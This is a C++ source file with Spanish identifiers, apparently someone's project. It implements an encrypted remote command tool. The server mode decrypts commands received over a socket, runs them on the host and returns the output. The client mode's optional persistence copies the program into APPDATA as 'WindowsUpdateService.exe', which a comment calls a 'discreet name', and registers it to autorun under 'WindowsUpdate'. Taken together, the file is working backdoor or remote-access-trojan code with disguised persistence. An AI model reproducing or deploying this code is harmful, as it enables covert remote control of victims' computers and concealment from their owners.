//Sofía Martínez Cisneros
#include <iostream>
#include <string>
#include <vector>
#include "Comm.h"
#include "Cripto.h"
#include "Exec.h"
#include "Persist.h"

void modoServidor(int puerto) {
    std::cout << "=== MODO SERVIDOR ===" << std::endl;
    
    Comm conexion;
    if (!conexion.iniciarServidor(puerto)) {
        std::cerr << "Error al iniciar servidor" << std::endl;
        return;
    }
    
    std::vector<unsigned char> llave = conexion.recibirLlave();
    if (llave.empty()) {
        std::cerr << "Error al recibir llave" << std::endl;
        return;
    }
    
    conexion.setLlave(llave);
    std::cout << "\n";
    Comm::imprimirLlave(llave);
    std::cout << "\nEsperando comandos cifrados...\n" << std::endl;
    
    while (true) {
        std::string mensajeCifrado = conexion.recibirMensaje();
        if (mensajeCifrado.empty()) {
            std::cout << "Cliente desconectado" << std::endl;
            break;
        }
        
        std::string comando = Cripto::desencriptar(mensajeCifrado, llave);
        std::cout << "Comando recibido (descifrado): " << comando << std::endl;
        
        if (comando == "exit" || comando == "salir") {
            std::cout << "Comando de salida recibido. Cerrando servidor..." << std::endl;
            break;
        }
        
        std::string resultado = Exec::ejecutarComando(comando);
        std::cout << "Resultado de ejecución:\n" << resultado << std::endl;
        
        std::string resultadoCifrado = Cripto::encriptar(resultado, llave);
        conexion.enviarMensaje(resultadoCifrado);
        std::cout << "Respuesta cifrada enviada al cliente\n" << std::endl;
    }
    
    conexion.cerrarConexion();
}

void modoCliente(const std::string& ip, int puerto, const std::vector<unsigned char>& llave, bool persistencia) {
    std::cout << "=== MODO CLIENTE ===" << std::endl;
    
    if (persistencia) {
        std::cout << "Configurando persistencia..." << std::endl;
        
        char rutaActual[MAX_PATH];
        GetModuleFileNameA(NULL, rutaActual, MAX_PATH);
        
        std::string nombreEjecutable = "WindowsUpdateService.exe";  // Nombre discreto
        
        if (Persist::copiarEjecutable(rutaActual, nombreEjecutable)) {
            std::string rutaDestino = Persist::obtenerRutaAPPDATA() + "\\" + nombreEjecutable;
            if (Persist::establecerPersistencia("WindowsUpdate", rutaDestino)) {
                std::cout << "Persistencia configurada exitosamente" << std::endl;
            } else {
                std::cout << "Error al configurar persistencia en registro" << std::endl;
            }
        } else {
            std::cout << "Error al copiar ejecutable a APPDATA" << std::endl;
        }
    }
    
    Comm conexion;
    if (!conexion.conectarCliente(ip, puerto)) {
        std::cerr << "Error al conectar con servidor" << std::endl;
        return;
    }
    
    std::cout << "\n";
    Comm::imprimirLlave(llave);
    std::cout << std::endl;
    
    if (!conexion.enviarLlave(llave)) {
        std::cerr << "Error al enviar llave" << std::endl;
        return;
    }
    
    conexion.setLlave(llave);
    std::cout << "Llave compartida exitosamente con el servidor\n" << std::endl;
    
    while (true) {
        std::string comando = Exec::capturarComando();
        
        if (comando.empty()) {
            continue;
        }
        
        std::string comandoCifrado = Cripto::encriptar(comando, llave);
        conexion.enviarMensaje(comandoCifrado);
        std::cout << "Comando cifrado enviado\n" << std::endl;
        
        if (comando == "exit" || comando == "salir") {
            std::cout << "Cerrando cliente..." << std::endl;
            break;
        }
        
        std::string respuestaCifrada = conexion.recibirMensaje();
        if (respuestaCifrada.empty()) {
            std::cout << "Servidor desconectado" << std::endl;
            break;
        }
        
        std::string respuesta = Cripto::desencriptar(respuestaCifrada, llave);
        std::cout << "Respuesta del servidor (descifrada):\n" << respuesta << std::endl;
    }
    
    conexion.cerrarConexion();
}

std::vector<unsigned char> parsearLlaveHex(const std::string& llaveHex) {
    std::vector<unsigned char> llave;
    
    if (llaveHex.length() != 32) {
        throw std::invalid_argument("La llave debe ser de 16 bytes (32 caracteres hex)");
    }
    
    for (size_t i = 0; i < llaveHex.length(); i += 2) {
        std::string byteString = llaveHex.substr(i, 2);
        unsigned char byte = static_cast<unsigned char>(std::stoul(byteString, nullptr, 16));
        llave.push_back(byte);
    }
    
    return llave;
}

void mostrarUso(const char* nombrePrograma) {
    std::cout << "Uso:" << std::endl;
    std::cout << "  Servidor: " << nombrePrograma << " servidor [puerto]" << std::endl;
    std::cout << "  Cliente:  " << nombrePrograma << " cliente [ip] [puerto] [llave_hex] [--persist|--nopersist]" << std::endl;
    std::cout << "\nEjemplos:" << std::endl;
    std::cout << "  " << nombrePrograma << " servidor 8888" << std::endl;
    std::cout << "  " << nombrePrograma << " cliente 127.0.0.1 8888 00112233445566778899aabbccddeeff --persist" << std::endl;
    std::cout << "  " << nombrePrograma << " cliente 127.0.0.1 8888 00112233445566778899aabbccddeeff --nopersist" << std::endl;
    std::cout << "\nNotas:" << std::endl;
    std::cout << "  - llave_hex: 16 bytes en hexadecimal (32 caracteres)" << std::endl;
    std::cout << "  --persist:   Establece persistencia en registro" << std::endl;
    std::cout << "  --nopersist: Sin persistencia (por defecto)" << std::endl;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        mostrarUso(argv[0]);
        return 1;
    }
    
    std::string modo = argv[1];
    
    try {
        if (modo == "servidor") {
            int puerto = (argc >= 3) ? std::stoi(argv[2]) : 8888;
            if (puerto < 1 || puerto > 65535) {
                std::cerr << "Error: Puerto inválido. Debe estar entre 1 y 65535" << std::endl;
                return 1;
            }
            modoServidor(puerto);
        } 
        else if (modo == "cliente") {
            std::string ip = (argc >= 3) ? argv[2] : "127.0.0.1";
            int puerto = (argc >= 4) ? std::stoi(argv[3]) : 8888;
            
            if (puerto < 1 || puerto > 65535) {
                std::cerr << "Error: Puerto inválido. Debe estar entre 1 y 65535" << std::endl;
                return 1;
            }
            
            std::vector<unsigned char> llave;
            bool persistencia = false;
            
            if (argc >= 5) {
                llave = parsearLlaveHex(argv[4]);
            } else {
                llave = Comm::generarLlave();
                std::cout << "Advertencia: No se proporcionó llave, usando llave generada automáticamente" << std::endl;
            }
            
            if (argc >= 6) {
                std::string persistFlag = argv[5];
                if (persistFlag == "--persist") {
                    persistencia = true;
                } else if (persistFlag != "--nopersist") {
                    std::cout << "Advertencia: Flag de persistencia no reconocido. Usando --nopersist por defecto" << std::endl;
                }
            }
            
            modoCliente(ip, puerto, llave, persistencia);
        } 
        else {
            std::cerr << "Error: Modo inválido. Use 'servidor' o 'cliente'" << std::endl;
            mostrarUso(argv[0]);
            return 1;
        }
    } 
    catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}
